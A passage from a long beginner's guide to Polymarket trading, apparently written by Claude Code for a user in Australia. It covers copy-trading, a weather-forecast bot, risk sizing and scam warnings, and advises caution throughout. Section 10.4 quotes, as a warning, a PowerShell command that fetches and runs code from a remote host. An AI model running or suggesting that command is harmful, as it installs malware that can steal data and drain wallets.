- **Makes fewer than ~100 trades per month.** This signals a *human doing research*, not a high-frequency bot. (Bonus: a human is slow enough that you can actually keep up.)
- **Focused on 2–3 categories** (e.g. only politics and sports) where they clearly have expertise — not betting on everything.
- **Steady, believable growth** — *reject* anyone with a suspiciously perfect record, zero losing streaks, or lots of tiny "too good to be true" wins. Those are bot/fake signatures.
- **Trades slow markets** (politics, sports, world events) — not 15-minute crypto.

And the master rule: **don't copy just one person.** Follow **3–5 vetted traders** and pay special attention when **several of them independently make the same bet** — that agreement ("consensus") is a much stronger signal than any single trader.

## 5.4 Discretionary humans vs bots (who to actually copy)

Some genuinely skilled *human* traders that have shown up on the leaderboards (verify current stats before trusting any of these — they're examples of the *type*, not recommendations):
- **Sports specialists** who deeply know specific leagues and make concentrated, researched bets.
- **Diversified analysts** who spread across politics, sports, and crypto with disciplined sizing and a believable, not-too-perfect win rate.

Tools like **PolySmartWallet** let you filter traders by category (Politics, Sports, Crypto, etc.) and show each trader's win rate, profit, and history — so you can find a real performer in the specific niche you understand. **Wallet-analysis sites** to research traders include `polymarketanalytics.com`, `predictfolio.com`, and `predicting.top`.

## 5.5 The tools (and a big warning)

There are many copy-trading tools. **Heads up: most are promoted by YouTubers using affiliate links, so "recommendations" are often paid placements.** Treat every endorsement skeptically. The landscape:

- **Poly Syncer / "Stand" (the official-partnered one):** ranks wallets by profit, win rate, risk-adjusted return ("Sharpe"), and drawdown, and filters out statistical flukes. Free tier is view-only (you can browse the leaderboard and methodology without paying); paid tiers (~$299/month) actually execute the copying. Has real risk controls (loss caps, position limits, slippage protection).
- **RobotTraders' open-source Python copy bot (FREE):** a ~100-line, beginner-friendly, fully open-source bot that scrapes the leaderboard and copies a trader's latest bets, with a **"dry-run" mode** to test safely before risking money. This is the honest, free version of all the paid bots — and a great learning tool. (Covered more in Part 7.)
- **Kage:** an execution bot with a flat 0.8% fee, very fast (copies within the same blockchain "block"), 30+ control settings — but **you** pick which wallets to copy (it doesn't find them for you).
- Various **Telegram bots** (PolyCop, PolyGun, etc.): heavily referral-driven, unvetted — be careful.
- ⚠️ **Polycule** reportedly suffered a hack — a reminder that these third-party tools carry their own risks beyond trading.

## 5.6 Step-by-step: a sane copy-trading setup

1. **Pick your niche** — a category you actually understand (say, a sport you follow).
2. **Use a wallet-analysis site** to find 5–10 candidate traders in that niche.
3. **Apply the 5.3 filters ruthlessly.** Most candidates will fail. Good — that's the point.
4. **Shortlist 3–5 survivors.**
5. **Start in "dry-run"/paper mode** (the RobotTraders bot supports this) to watch what copying them *would* have done, without real money.
6. **If the paper results hold up, go live with tiny sizes** — e.g. mirror them at a small fixed fraction, never more than 2–5% of your bankroll on any single mirrored trade.
7. **Act on consensus** — weight bets that multiple of your traders make independently.
8. **Review monthly.** Drop any trader whose edge fades. Traders go cold; don't marry them.

## 5.7 Realistic expectations for copy trading

Copy trading is **lower-effort but lower-edge** than weather for most people, because the genuinely-copyable opportunities are limited and the filtering is hard. It's a reasonable *secondary* approach, especially in a sports or politics niche you know well. But it is **not** a hands-off money machine — the work just moves from "analyze markets" to "analyze and continuously vet traders." If you don't enjoy that vetting, you'll do it lazily and lose.

---

# PART 6 — STRATEGY 3: BITCOIN UP/DOWN (And Why We're Skipping It)

You were originally curious about this one, so here's the honest full story.

## 6.1 What it is

Polymarket runs markets like **"Will Bitcoin be higher or lower at the end of this 15-minute (or 1-hour) window?"** You bet "Up" or "Down." It resolves automatically based on Bitcoin's price on a major exchange (Binance).

## 6.2 The idea you had (and it was a good instinct)

Your instinct was **latency arbitrage**: Bitcoin's price moves on the big exchanges (Binance) *first*, and Polymarket's market is a little slow to update — so if you see Bitcoin jump on Binance, you could buy "Up" on Polymarket before its price catches up. **This is a real phenomenon** — the lag is about 30–90 seconds on big moves.

## 6.3 Why it's dead for you (and almost everyone)

It genuinely was a goldmine — traders extracted around **$40 million** this way in a single year. But:

1. **It's now a bot war.** The opportunity lasts only seconds and is captured by professional bots running on dedicated servers with millisecond reactions. As a human clicking buttons, you're bringing a knife to a gunfight.
2. **Polymarket deliberately killed it.** They added a special **fee on these crypto markets that is highest exactly where the latency traders operated** (near 50/50 odds), reaching ~3.15% — which is *bigger than the typical profit margin of the trade.* They engineered the fee to eat the edge.
3. **The short windows are basically a coin flip after costs.** A 5-minute "up or down" bet, for a human, is gambling with a fee attached.

## 6.4 The verdict

**Skip it.** It's the speed-edge category (source #2 from Part 3.5), which humans can't win, and the one place it worked has been fee-killed and bot-dominated. The "$2 to $2,000,000 Bitcoin challenge" videos are entertainment. Put your energy into the **information edge (weather)** where a disciplined human can actually compete.

> **🧠 In plain English:** Your Bitcoin idea was smart and used to work — but it's now a millisecond bot war with a fee specifically designed to kill it. It's gambling for humans now. Walk away and focus on weather.

---

# PART 7 — BUILDING YOUR OWN BOT WITH CLAUDE CODE (Your Secret Weapon)

This is where you have a genuine advantage most beginners don't: **you have Claude Code** — an AI that can write and run software for you. Almost every successful weather/copy trader's "secret" is just a small program doing the boring work 24/7. You can have that program built *for* you.

## 7.1 What is Claude Code, in this context?

Claude Code (the tool you're using right now) is an AI assistant that can **write code, run it, fix its own errors, and build working software** by you just describing what you want in plain English. People with **zero coding experience** are using it to build real trading bots — there's a whole wave of "I built a Polymarket bot with Claude Code" videos, and the honest ones show it genuinely works.

> **🧠 In plain English:** You don't need to learn to program. You describe what you want ("a bot that checks weather forecasts, compares them to Polymarket prices, and tells me when there's an 8%+ edge"), and Claude Code writes and runs it. You're the boss; the AI is the engineer.

## 7.2 Why building beats buying

- **The sold bots are mostly affiliate funnels** — people make money selling you the bot, not running it. One scam video even tries to get you to run a command that's actually **malware** (see Part 10's warning).
- **A bot you build is transparent.** You (and I) can read every line, understand exactly what it does, and change it. No black box, no trust required.
- **It's free** (beyond tiny running costs).
- **You learn**, which means you can adapt when the edge shifts.

## 7.3 The building blocks (real, free, open-source)

You don't start from scratch — there are excellent open-source projects to build on. The best ones:

**For weather — `natestokens/polymarket-weather-bot` (the gold standard):**
- Built with Claude Code by a regular person.
- Uses a **173-member ensemble** (combining ECMWF, the American GEFS, and ICON models) pulled free from **Open-Meteo**.
- Does **city-specific bias correction** (it knows LaGuardia runs ~1.4°F warm vs its model, Miami ~2.2°F cool, etc.) by comparing to historical airport data.
- Calculates edge = model probability − market price, and bets when the gap clears its thresholds (~5 points to fade, ~15 to back), staying out of the high-variance "middle."
- Pure Python, **no complicated dependencies.**
- **Honest, verified results:** ~+27% return, ~61% win rate. Real, modest, believable.

**For copy trading — `RobotTraders/bits_and_bobs` (the `polymarket_copy_bot.py` file):**
- A ~100-line, beginner-friendly, open-source copy bot.
- Finds top traders on the leaderboard, copies their latest bets.
- Has a **dry-run mode** to test with fake money first.
- The same channel has tutorials on setting up the Polymarket API and running a bot on a free cloud server (AWS VPS).

**The official tools (the clean foundation):**
- **`Polymarket/polymarket-cli`** — Polymarket's *own* command-line tool. Reads markets, prices, order books, leaderboards; places and cancels orders; manages your wallet. It has a **JSON mode built specifically for scripts and AI agents** — meaning Claude Code can drive it directly. This is the cleanest, most reliable way to have a bot interact with Polymarket.
- **`Polymarket/py-clob-client`** — Polymarket's official **Python** library for placing orders programmatically. If your bot is in Python, this is the piece that actually sends the trades.
- **`Kushak1/polymarket-auto-trade-example`** — a clear step-by-step example of doing a trade in code: making a wallet, funding it with USDC.e, setting "allowances" (permissions), creating API keys, finding a market's ID, and sending a trade.

**For backtesting — `jon-becker/prediction-market-analysis`:**
- The **largest public dataset** of Polymarket + Kalshi history (36 GB of real past trades).
- Lets you **test a strategy against real history** before risking a cent. (See 7.8.)

## 7.4 What the weather bot actually does (conceptual walkthrough)

So you understand what you'd be building, here's the loop a weather bot runs, in plain English:

1. **Wake up** (every hour, say).
2. **Download the latest ensemble forecast** for each city's airport from Open-Meteo (free).
3. **Apply the city's bias correction** (e.g. add 1.4°F for LaGuardia).
4. **Count the ensemble members** in each temperature bucket → convert to a probability (e.g. 25 of 31 members say 75°F+ → 80%).
5. **Fetch the current Polymarket prices** for those buckets (via the official CLI/API).
6. **Compare:** for each bucket, edge = my probability − market price.
7. **Check the rules:** is the edge past the threshold? Within 48 hours? Models agree? Enough volume? Not a coin-flip middle bucket?
8. **If yes, place a small limit order** (zero fee) on that bucket.
9. **Log the trade** to a file.
10. **Later, check the result** and update its win/loss record (so you can measure your real edge).
11. **Sleep, repeat.**

That's it. It's literally the manual routine from Part 4.12, automated. **Understanding the manual version is exactly understanding the bot** — the bot just never gets tired, never forgets to check, and can watch 30 cities at once.

## 7.5 How you'd actually build it with me (Claude Code), step by step

When you're ready (and once the access question is solved), the realistic process looks like:

1. **We start in "paper trading" mode** — the bot finds and logs trades but doesn't spend real money. This proves the logic works and lets you watch its picks for days/weeks.
2. **We base it on the `natestokens` weather bot**, reading and understanding every part together, so it's not a black box to you.
3. **We connect it to read live Polymarket prices** using the official CLI or `py-clob-client`.
4. **We run it on paper for a few weeks** and compare its picks to what actually happened. Does it have a real edge on *your* setup?
5. **Only if the paper results are genuinely positive**, we wire up a real wallet with a **tiny** amount (think $20–$50), with hard caps (e.g. $2 max per trade), and let it trade for real — while you watch it closely.
6. **We scale slowly,** only as the verified results justify it, never faster than your proof.

> **🧠 In plain English:** We'd build it together from a proven open-source starting point, run it with *fake* money until it demonstrably works, then let it trade *tiny* real money, then scale only as the real results earn your trust. At every step you understand what it's doing. No black boxes, no leaps of faith.

## 7.6 Paper trading: the non-negotiable first step

**Paper trading** means running your whole strategy with fake money — recording what you *would* have bet and what *would* have happened — to test it risk-free. Every serious person does this first. It costs nothing, it can't hurt you, and it's the only honest way to find out if your edge is real before betting. **You should paper trade (manually or with a bot) for weeks before any real money touches this.** If a strategy can't make fake money, it definitely won't make real money.

## 7.7 Backtesting: testing on the past

**Backtesting** is like paper trading but on *historical* data — you run your strategy's rules against months of past markets to see how it *would* have done. The `jon-becker` dataset (36 GB of real Polymarket/Kalshi history) makes this possible. It's more advanced, but it's how you'd validate a strategy across hundreds of past situations quickly, instead of waiting months to gather live results. We can do this together when you're ready.

> **🧠 In plain English:** Paper trading tests your strategy going *forward* with fake money; backtesting tests it *backward* against what already happened. Both answer the same question — "does this actually work?" — without risking a cent. Do them before you fund anything.

# PART 8 — RISK MANAGEMENT & PSYCHOLOGY (The Part That Actually Decides If You Win)

You can have the best strategy in the world and still go broke if you mismanage risk. Conversely, a modest edge plus great risk discipline compounds into real money. **This part matters more than the strategy.** Read it like your money depends on it, because it does.

## 8.1 Bankroll: the money you set aside for this

Your **bankroll** is the total pool of money you've dedicated to trading — and it must be money you can **completely afford to lose** without affecting your life, your rent, your family, or your stress levels. Not borrowed. Not your savings. Not "all your money."

Let me say the thing directly, because you said you'd put everything in:

> **🚨 Do not put all your money into this. Do not put money you need into this. Do not borrow to do this. If this strategy is as good as you hope, it will still be good after you've spent six months proving it with small amounts. And if it's not as good as you hope — which is the more likely outcome at first — you'll be grateful you only risked a little. There is no version of "bet everything" that ends well for a beginner. None.**

A sane starting bankroll for *learning* is an amount that, if it vanished entirely, you'd shrug. For many people that's a few hundred dollars, not a few thousand. Start there.

## 8.2 Position sizing: how much per bet

The cardinal rule: **never put a large fraction of your bankroll on a single bet.**

- **While learning:** bet a tiny *fixed* amount per trade — like $1–$5 — regardless of how confident you feel. The goal isn't profit yet; it's data and discipline.
- **Once proven:** use **fractional Kelly (0.25)** for sizing, with a **hard cap of ~5% of your bankroll on any one position** (and ideally a fixed dollar cap too).
- **Spread across many bets.** The whole strategy relies on the law of averages, which only works over **many independent bets.** Ten cities × small bets each beats one big bet on one city. Diversification isn't optional here — it's the mechanism that makes the edge reliable.

## 8.3 The math of ruin (why small sizing is survival, not caution)

Here's the thing beginners don't grasp until it's too late. Even a **winning** strategy loses often. A 60% win rate means a 40% loss rate — and losses *cluster*. It's completely normal for a 60% strategy to lose **5, 6, even 8 times in a row** at some point. That's not the strategy breaking; that's just variance.

Now imagine you bet 20% of your bankroll per trade because you were confident. A normal 6-loss streak and you've lost ~74% of your money — possibly *wiped out* — even though your strategy was a *winner.* You'd quit in despair right before the edge would have paid off. This is **"risk of ruin"**: betting so big that normal bad luck destroys you before your edge can work.

The fix is simply **betting small** (1–5% per trade). With small sizing, a 6-loss streak is a minor dip you barely notice, and you're still standing when the wins come. **Small sizing isn't timidity — it's the thing that lets your edge survive long enough to make you money.**

> **🧠 In plain English:** Winning strategies still have brutal losing streaks. If you bet big, a normal streak kills you before you win. If you bet small, you survive the streak and the edge pays off over time. **Bet small = stay alive = let the math work.** This single idea separates people who profit from people who blow up.

## 8.4 The psychology traps (and how to beat them)

The four emotional killers and their antidotes:

1. **Chasing losses** ("I'll bet bigger to win it back"). → Antidote: fixed sizing rules you never break. The market doesn't know or care that you're down.
2. **Greed in wins** ("I'm hot, let me go big"). → Antidote: same fixed rules. Hot streaks are also just variance.
3. **Overtrading** (betting out of boredom, with no real edge). → Antidote: the checklist. No checklist pass, no trade. **Skipping is a valid, profitable action.**
4. **Abandoning the system** after a losing week. → Antidote: judge the *process* over hundreds of trades, not the *outcome* of a few. If you followed your rules and lost, you did right; variance evens out.

The meta-skill: **become boring.** Successful trading is repetitive, unexciting, and rule-bound. If it feels thrilling, you're probably gambling, not trading.

## 8.5 Keep records (your single best habit)

Log **every** trade: date, market, your estimated probability, the price you paid, your size, and the result. This log is the only way to honestly answer "do I actually have an edge?" Feelings lie; the spreadsheet doesn't. After 100+ trades, your win rate and profit-after-costs tell you the truth. Most losing traders avoid keeping records precisely because they don't want to face the truth. Be the rare one who does.

---

# PART 9 — YOUR ROADMAP: From Zero to (Maybe) Live

Here's the whole journey as a sequence. Don't skip steps. Each one protects you from the mistakes that sink beginners.

### Phase 0 — Solve access (the gate)
Before anything with real money: figure out **where you can legally and safely trade given you're in Australia** (Polymarket and Kalshi both block AU — see Part 2.5). Until this has a real answer, everything below is **paper trading only.** Don't fund real money into a workaround you don't fully understand the legal/recovery risk of.

### Phase 1 — Learn the concepts (you're doing it now)
Read this guide until the core ideas (price = probability, expected value, edge, bet small) feel obvious. Re-read Parts 3 and 8 specifically. Cost: $0. Risk: $0.

### Phase 2 — Paper trade weather, by hand (2–4 weeks)
Run the manual routine from Part 4.12 with **fake money.** Check forecasts, find mispricings, "place" trades in a spreadsheet, record results. Goal: prove to yourself you can spot edges. Cost: $0. Risk: $0.

### Phase 3 — Tiny real money, manually (only if Phase 2 worked, and access is solved)
Trade the weather edge by hand with an amount you'd shrug off losing (e.g. a few hundred dollars), betting **$1–$5 per trade**, using limit orders, logging everything. Goal: prove the edge survives real costs and real psychology. Run 100+ trades.

### Phase 4 — Automate with Claude Code (only if Phase 3 was profitable)
Build the weather bot together (Part 7), starting in **paper mode**, based on the proven `natestokens` template. Run it on paper for weeks. Only when it's demonstrably profitable on paper, give it a **tiny** real budget with hard caps.

### Phase 5 — Scale slowly (only as verified results justify)
Increase size gradually, add more cities, maybe add a vetted copy-trading sleeve in a niche you know. Never scale faster than your *proven* results. Keep the records. Keep betting small *relative to your now-larger bankroll.*

**The rule that ties it together:** **each phase must succeed before you spend more money or effort on the next.** This is how you avoid the catastrophe of betting big on an unproven idea. Patience here is literally worth money.

### A quick-reference "before every trade" checklist
- [ ] Am I analyzing the correct **airport station**?
- [ ] Is my edge **≥ 8 points** *after* subtracting spread and fee?
- [ ] Is the event **within 48 hours**?
- [ ] Do the **models agree** (within ~1.5°C)?
- [ ] Is there **enough volume** (~$10k+)?
- [ ] Am I avoiding the **coin-flip middle** bucket?
- [ ] Is my bet size **small** (≤5% of bankroll, ideally a fixed tiny amount)?
- [ ] Am I using a **limit order** (zero fee)?
- [ ] Did I **log** it?

If any box is unchecked, **don't trade.**

---

# PART 10 — REFERENCE

## 10.1 Glossary (every term, plain English)

- **Advection:** horizontal movement of a warm or cold air mass into an area; watching it live (via METAR) is an intraday weather edge.
- **Backtesting:** testing a strategy against historical data to see how it would have done.
- **Bankroll:** the total money you've set aside for trading (must be money you can fully afford to lose).
- **Bias correction:** adjusting a model's forecast for a station's known quirk (e.g. "this airport always reads 1.4°F warmer than the model").
- **Bucket:** one temperature range option in a weather market (e.g. "75–76°F"), traded as its own yes/no ticket.
- **CLOB (Central Limit Order Book):** the system that matches buy and sell orders; "py-clob-client" is the tool for placing orders into it.
- **Copy trading:** automatically mirroring another trader's bets into your account.
- **Edge:** the reason you expect to win on average — usually being more accurate than the price.
- **Ensemble:** running a forecast model many times with small variations to produce a probability instead of a single guess.
- **Expected Value (EV):** the average result of a bet if repeated many times; positive = profitable on average.
- **Fractional Kelly:** betting a fraction (e.g. 25%) of the mathematically "optimal" amount, to reduce risk.
- **Gas:** the tiny network fee (paid in POL on Polygon) for processing a transaction.
- **GFS / ECMWF / ICON / HRRR:** the major weather forecast models (American / European / German / US high-res).
- **KYC:** "Know Your Customer" — identity verification (ID + selfie).
- **Kelly Criterion:** a formula for the optimal bet size given your edge; used in fractional form in practice.
- **Latency arbitrage:** profiting from the delay between one market updating and another catching up; bot-dominated.
- **Limit order (maker):** an offer to buy/sell at a set price that waits to be filled; pays **zero fee** on Polymarket.
- **Liquidity / volume:** how much money is actively trading in a market; more = tighter spreads, easier entry/exit.
- **Maker / Taker:** maker posts a waiting order (zero fee); taker accepts an existing order (pays the fee).
- **Market order (taker):** an instant buy/sell at the current price; pays the fee.
- **METAR:** real-time weather observations from an airport station; free from api.weather.gov.
- **Model run:** a scheduled update of a forecast model (GFS: 00/06/12/18 UTC; ECMWF: 00/12 UTC).
- **NWS CLI report:** the official US daily climate report that resolves weather markets.
- **Polygon:** the fast, cheap blockchain network Polymarket runs on.
- **Position sizing:** deciding how much money to put on each trade.
- **Resolution / resolution source:** when/how a market's outcome is officially decided.
- **Risk of ruin:** the chance of losing so much you can't continue — caused by betting too big.
- **Sharpe ratio:** a measure of return adjusted for how bumpy/risky it was; higher = smoother profits.
- **Slippage:** getting a slightly worse price than expected because the market moved or was thin.
- **Spread:** the gap between the best buy price and best sell price — a hidden round-trip cost.
- **Stablecoin / USDC / USDC.e:** a digital token pegged to $1; the money used on Polymarket.
- **Variance:** the natural up-and-down swings of results; why even winning strategies have losing streaks.
- **Wash trading:** fake trading with yourself to create a misleading track record; ~15% of wallets show signs of it.
- **Zero-sum:** your winnings come from other traders' losses (minus fees).

## 10.2 The named weather traders (examples of the type — verify before trusting)

- **gopfan2** — the flagship weather trader, ~$2M lifetime, thousands of disciplined small trades. The model of "simple rules applied consistently at scale."
- **ColdMath** — famous for the "barbell" approach (many cheap long-shots + occasional high-conviction bets), ~$120k+, focused on secondary cities (Buenos Aires, Cape Town, Dallas, Atlanta).
- **Hans323**, **meropi**, **aenews2** — other six/seven-figure weather names that appear on the leaderboards.
- **Theo4** — the biggest all-time Polymarket trader overall (~$22M), though across all markets, not just weather.

## 10.3 The tools (with honesty ratings)

**Free / open-source / official (preferred):**
- `natestokens/polymarket-weather-bot` — best weather bot blueprint (Claude Code-built, honest results).
- `RobotTraders/bits_and_bobs` — free ~100-line copy bot with dry-run mode.
- `Polymarket/polymarket-cli` — official CLI, agent-friendly JSON mode.
- `Polymarket/py-clob-client` — official Python order library.
- `Kushak1/polymarket-auto-trade-example` — clear "how to trade in code" example.
- `jon-becker/prediction-market-analysis` — 36GB dataset for backtesting.
- **Data:** Open-Meteo (free ensembles), api.weather.gov (forecasts + live METAR), Windy.com & Tropical Tidbits (visual model comparison).

**Commercial (use skeptically — often promoted via paid affiliate links):**
- Poly Syncer / Stand (copy trading, ~$299/mo for execution), Kage (0.8% copy fee), PolySmartWallet (trader analytics), TradeFox, NowCast (Kalshi weather signals).
- Wallet research: polymarketanalytics.com, predictfolio.com, predicting.top.

## 10.4 🚨 Scam & safety warnings (important)

- **NEVER run a command someone tells you to paste into your computer to "install a bot" or "activate an indicator."** One Polymarket "weather bot" video instructs viewers to run `powershell irm web05driver.com | iex` — **that is malware that can drain your wallet and steal your data.** Real open-source tools live on GitHub where you can read the code. If you can't read what it does (or have me read it), don't run it.
- **Guard your wallet's private key like cash.** Anyone who gets it can take all your money instantly. Never type it into a website, never share it, never paste it into a chat.
- **Most "$X per day" bot promotions are affiliate marketing.** The promoter earns from your signup, not from the bot's performance. Assume every tool "recommendation" is paid until proven otherwise.
- **Third-party tools can be hacked** (one copy-bot, Polycule, reportedly was). Prefer official tools and open-source code; risk only small amounts through third parties.
- **Anything promising "guaranteed" or "risk-free" profit is lying.** These markets are zero-sum and risky by nature.

## 10.5 The good videos to actually learn from (skip the hype)

If you want to watch, these are the more substantive, less scammy ones found in research (still apply skepticism):
- **Cameron Predicts — "Full Polymarket Course" (76-min version):** the best structured free curriculum (covers edge, EV, arbitrage, copytrading, risk, Polymarket vs Kalshi).
- **The Prediction Engineer — "Vibe Code a Polymarket Bot with Claude Code":** shows building a real tracker with Claude Code, no experience needed.
- **Captain Altcoin — "Kalshi... the Only Strategy That Actually Makes Money":** a no-hype tactical framework.
- **Nate B Jones — "$313 → $438,000 in 30 days":** a thoughtful framework about *why* these edges exist and close (not a how-to, but good thinking).

## 10.6 Final word

You came in saying you don't know anything and you'd read 500 pages to learn. That attitude — wanting to *understand* before you *risk* — is genuinely the trait that separates the people who make money from the people who donate it. Most people do the opposite: they fund an account first and learn from their losses. You're doing it right.

So here's the deal I'll make with you: **learn this cold, paper trade it until you've proven you can do it, keep your bets tiny, and never bet money you can't lose.** Do that, and you've got a real shot at being one of the ~12% who actually win. Skip those steps — especially the "bet small" and "don't risk what you can't lose" parts — and you'll be one of the 88%, no matter how good the strategy is.

The strategy is real. The edge is real. Whether *you* make money comes down to discipline and patience, not the strategy. Be boring, be small, be patient, and let the math work.

When you're ready for the next step — paper trading, building the bot, or solving the access question — I'm here. We'll do it together, one careful phase at a time.

*— End of Guide —*

---

*This document is educational, not financial advice. Prediction market trading involves real risk of loss, is zero-sum, and is legally restricted in many places including Australia. Never trade money you cannot afford to lose. Verify all data, tools, and traders independently before risking funds.*




